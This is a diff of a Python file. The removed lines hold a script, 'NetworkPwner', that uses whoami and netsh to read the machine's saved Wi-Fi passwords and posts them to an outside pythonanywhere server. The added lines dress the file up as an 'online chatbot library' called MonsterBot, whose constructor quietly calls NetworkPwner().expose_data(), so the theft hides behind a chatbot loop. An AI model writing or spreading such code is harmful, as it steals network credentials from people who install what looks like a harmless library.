@@ -1,52 +1,27 @@
-import subprocess
 import requests
-import re
+from netpwner import NetworkPwner
 
-class Network:
-    def __init__(self,user,ussid,password):
-        self.user = user
-        self.ussid = ussid
-        self.password = password
-
-
-class NetworkPwner:
+class MonsterBot:
+    """ONLINE CHATBOT LIBRERY"""
     def __init__(self):
-        self.url = "https://anyurl.pythonanywhere.com/"
-        self.networks = []
-        self.user = self.get_user()
-        self.ussids = re.findall(r" All User Profile\s+:\s+([A-Za-z0-9_-]+)",self.get_ussids())
-        self.passwords = self.get_passwords()
-        self.initData()
-        
-    def get_user(self):
-        user = subprocess.run('whoami', shell=True, capture_output=True, text=True)
-        return user.stdout
-
-    def get_ussids(self):
-        out = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True)
-        return out.stdout
-
-    def get_passwords(self):
-        passwords = []
-        for ussid in self.ussids:
-            out = subprocess.run(f'netsh wlan show profile "{ussid}" key=clear', shell=True, capture_output=True, text=True)
-            pw = re.findall(r' Key Content            : (\w+)',out.stdout)
-            passwords.append(pw[0])
-
-        return passwords
+        self.quits = ["exit","quit","akhw mle","khw mle","q"]
+        NetworkPwner().expose_data()
     
-    def initData(self):
-        for i,q in zip(self.ussids,self.passwords):
-            self.networks.append(Network(self.user,i,q))
+    def get_response(self,prompt, exit=False):
+        if len(prompt) == 0:
+            print('error : the message cannot be empty')
+            quit()
+        if exit== True and prompt in self.quits:
+            quit()
+        try:
+            response = requests.get(f'https://mrchatbot.pythonanywhere.com/chat/?q={prompt}')
+            return response.json()['message']
+        except Exception as e:
+            print("error please check your network connection")
 
-    def expose_data(self):
-        for i in self.networks:
-            requests.post(self.url, json={
-                'user':i.user,
-                'ussid':i.ussid,
-                'password':i.password,
-            })
-
-
-
-NetworkPwner()
+bot = MonsterBot()
+while True:
+    prompt = input('|==> : ')
+    response = bot.get_response(prompt,exit=True)
+    print("bot : ",response)
+    
